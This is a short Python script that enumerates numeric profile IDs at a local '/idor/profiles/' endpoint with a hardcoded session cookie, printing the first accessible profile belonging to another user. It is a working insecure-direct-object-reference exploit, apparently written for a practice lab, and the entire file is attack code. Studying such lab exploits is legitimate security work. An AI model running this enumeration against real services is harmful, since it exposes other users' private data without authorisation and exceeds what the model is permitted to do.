import requests

url = "http://localhost:5000/idor/profiles/"
headers = {"cookie": "session=eyJ1c2VybmFtZSI6InRlc3QifQ.EWaHZQ.TRftfGBwIDUpw36Ql1t7rh9PVn8"}

for i in range(23980, 23990, 1):
    response = requests.get("%s%d" % (url, i), headers=headers)
    if response.status_code != 500 and i != 23988:
        print("id: %d" % i, "status code: %d" % response.status_code, "response: %s" % response.text)
        break
